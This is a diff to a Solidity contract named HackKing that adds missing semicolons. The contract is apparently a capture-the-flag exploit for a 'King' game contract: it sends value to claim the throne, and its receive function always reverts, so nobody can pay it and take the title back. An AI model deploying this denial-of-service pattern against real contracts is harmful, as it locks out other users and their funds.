@@ -5,15 +5,15 @@ contract HackKing {
   address public kingContract;
 
   constructor(address _kingContract) public payable {
-    kingContract = _kingContract
+    kingContract = _kingContract;
   }
 
   function crownMe(uint _value, uint _gas) public {
-    address(kingContract).call.value(_value).gas(_gas)
+    address(kingContract).call.value(_value).gas(_gas);
   }
 
   receive() external payable {
-    revert()
+    revert();
   }
 
 }
